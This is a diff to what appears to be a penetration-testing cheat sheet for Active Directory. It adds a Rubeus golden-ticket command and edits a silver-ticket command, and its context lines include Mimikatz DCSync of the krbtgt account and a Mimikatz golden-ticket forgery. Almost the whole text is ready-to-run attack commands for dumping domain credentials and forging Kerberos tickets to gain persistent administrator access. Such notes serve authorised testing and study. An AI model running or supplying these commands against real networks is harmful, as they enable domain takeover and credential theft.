@@ -33,6 +33,10 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 - Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
 - To get the SID use ```Get-DomainSID``` from powerview
 ```
+.\Rubeus.exe golden /aes256:<KRBTGT AES KEY> /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /nowrap
+```
+
+```
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
@@ -58,7 +62,11 @@ Get-wmiobject -Class win32_operatingsystem -ComputerName <COMPUTERNAME>
 - Use the hash of the local computer
 - Other services are HOST, RPCSS, WSMAN
 ```
-.\Rubeus.exe silver /service:<CIFS>/<FQDN> /aes256:<AES> /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN SID> /ptt
+.\Rubeus.exe silver /service:<CIFS>/<FQDN> /aes256:<AES> /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN SID> /nowrap
+```
+
+```
+
 ```
 
 #### Check access 
